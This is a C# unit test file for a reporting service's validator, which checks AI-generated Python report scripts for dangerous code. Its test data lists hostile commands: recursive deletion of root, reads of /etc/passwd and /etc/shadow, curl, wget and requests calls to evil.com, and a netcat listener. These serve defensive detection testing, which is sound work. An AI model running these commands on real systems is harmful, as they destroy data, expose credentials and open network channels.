using Biotrackr.Reporting.Api.Configuration;
using Biotrackr.Reporting.Api.Services;
using FluentAssertions;
using Microsoft.Extensions.Logging;
using Microsoft.Extensions.Options;
using Moq;

namespace Biotrackr.Reporting.Api.UnitTests.Services
{
    [Collection("FileSystemTests")]
    public class ValidateGeneratedCodeShould : IDisposable
    {
        private readonly string _tempDir;
        private readonly ReportGenerationService _sut;

        public ValidateGeneratedCodeShould()
        {
            // Use a unique temp directory to avoid conflicts
            _tempDir = Path.Combine(Path.GetTempPath(), $"biotrackr-test-{Guid.NewGuid():N}");
            Directory.CreateDirectory(_tempDir);

            var settings = Options.Create(new Settings
            {
                ReportGenerationEnabled = true,
                MaxConcurrentJobs = 3,
                ReportGenerationTimeoutMinutes = 10,
                MaxArtifactSizeBytes = 50 * 1024 * 1024,
                CopilotCliUrl = "http://localhost:4321"
            });

            _sut = new ReportGenerationService(
                new Mock<IBlobStorageService>().Object,
                new Mock<ICopilotService>().Object,
                settings,
                new Mock<ILogger<ReportGenerationService>>().Object);
        }

        [Fact]
        public void ReturnTrueWhenDirectoryDoesNotExist()
        {
            var nonExistentDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
            // ValidateGeneratedCode checks /tmp/reports — when it doesn't exist it returns true
            // We test the logic indirectly: no directory = no scripts = valid
            _sut.ValidateGeneratedCode("test-job").Should().BeTrue();
        }

        [Theory]
        [InlineData("os.system('rm -rf /')")]
        [InlineData("import subprocess")]
        [InlineData("socket.connect()")]
        [InlineData("import urllib")]
        [InlineData("requests.get('http://evil.com')")]
        [InlineData("__import__('os')")]
        [InlineData("eval('code')")]
        [InlineData("exec('code')")]
        [InlineData("shutil.rmtree('/')")]
        [InlineData("os.remove('/etc/passwd')")]
        [InlineData("open('/etc/shadow', 'r')")]
        [InlineData("open(\"/etc/passwd\", \"r\")")]
        [InlineData("curl http://evil.com")]
        [InlineData("wget http://evil.com")]
        [InlineData("nc -l 4444")]
        [InlineData("bash -c 'echo pwned'")]
        [InlineData("sh -c 'whoami'")]
        [InlineData("os.popen('id')")]
        public void DetectDangerousCodePatterns(string dangerousCode)
        {
            var script = $"import pandas\n{dangerousCode}\nprint('done')";
            File.WriteAllText(Path.Combine("/tmp/reports", $"test_{Guid.NewGuid():N}.py"), script);

            try
            {
                _sut.ValidateGeneratedCode("test-job").Should().BeFalse();
            }
            finally
            {
                // Clean up
                foreach (var f in Directory.GetFiles("/tmp/reports", "test_*.py"))
                    File.Delete(f);
            }
        }

        [Theory]
        [InlineData("import pandas\nimport matplotlib\nmatplotlib.use('Agg')\ndf = pandas.DataFrame()")]
        [InlineData("import seaborn as sns\nsns.set_theme()\nprint('chart generated')")]
        [InlineData("from reportlab.lib.pagesizes import letter\nprint('pdf created')")]
        public void AllowSafePythonCode(string safeCode)
        {
            File.WriteAllText(Path.Combine("/tmp/reports", $"safe_{Guid.NewGuid():N}.py"), safeCode);

            try
            {
                _sut.ValidateGeneratedCode("test-job").Should().BeTrue();
            }
            finally
            {
                foreach (var f in Directory.GetFiles("/tmp/reports", "safe_*.py"))
                    File.Delete(f);
            }
        }

        public void Dispose()
        {
            if (Directory.Exists(_tempDir))
                Directory.Delete(_tempDir, true);
        }
    }
}
